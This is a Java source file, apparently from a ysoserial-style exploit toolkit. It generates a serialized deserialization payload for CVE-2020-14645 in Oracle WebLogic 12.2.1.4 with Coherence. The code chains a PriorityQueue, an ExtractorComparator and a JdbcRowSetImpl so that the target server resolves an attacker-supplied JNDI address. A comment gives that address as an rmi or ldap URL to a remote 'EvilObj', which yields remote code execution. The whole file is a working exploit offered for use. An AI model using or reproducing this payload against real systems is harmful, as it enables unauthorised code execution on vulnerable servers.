package payloads;

import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;
import common.Serializerable;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import java.lang.reflect.Field;
import java.util.PriorityQueue;


/*

See: https://github.com/Y4er/CVE-2020-14645
Command: rmi/ldap://xxxxxxx:xxx/EvilObj
 */

// CVE-2020-14645

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"weblogic:12.2.1.4, coherence"})
@Authors({ Authors.FROHOFF })
public class Weblogic5 implements ObjectPayload<Object> {

	public byte[] getObject(final String command) throws Exception {
		UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
		final ExtractorComparator comparator = new ExtractorComparator(extractor);

		JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
		rowSet.setDataSourceName(command);
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

		Object[] q = new Object[]{rowSet, rowSet};

		Field queue1 = queue.getClass().getDeclaredField("queue");
		queue1.setAccessible(true);
		queue1.set(queue,q);

		Field queue2 = queue.getClass().getDeclaredField("size");
		queue2.setAccessible(true);
		queue2.set(queue,2);

		return Serializerable.serialize(queue);
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return Weblogic5.class.newInstance().getObject(command);
	}

}
